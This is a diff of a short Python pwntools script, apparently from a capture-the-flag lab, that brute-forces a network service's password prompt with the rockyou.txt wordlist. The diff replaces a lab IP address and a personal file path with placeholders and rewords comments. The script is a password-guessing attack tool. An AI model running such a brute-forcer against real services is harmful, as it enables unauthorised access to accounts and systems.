@@ -1,11 +1,11 @@
 from pwn import *
 
-# Set the host and port
-host = "10.10.23.85"
-port = 8000
+# Set the host and port with actual values
+host = "TARGET_IP"
+port = TARGET_PORT
 
 # File path for rockyou.txt password list
-password_file = "/home/mauzware/Desktop/rockyou.txt"
+password_file = "/path/to/rockyou.txt"
 
 # Connect to the target
 def connect_to_service():
@@ -25,10 +25,10 @@ def attempt_password(password):
     # Send the password from the list
     conn.sendline(password.encode())
 
-    # Receive the response and check if we're prompted for a password again
+    # Receive the response and check if prompted for a password again
     response = conn.recvline(timeout=2)
     response = conn.recvline(timeout=2)
-    # Check if we're asked for the password again (indicates incorrect password)
+    # Check if asked for the password again (indicates incorrect password)
     if b"Password:" in response:
         print(f"Password '{password}' failed.")
         conn.close()
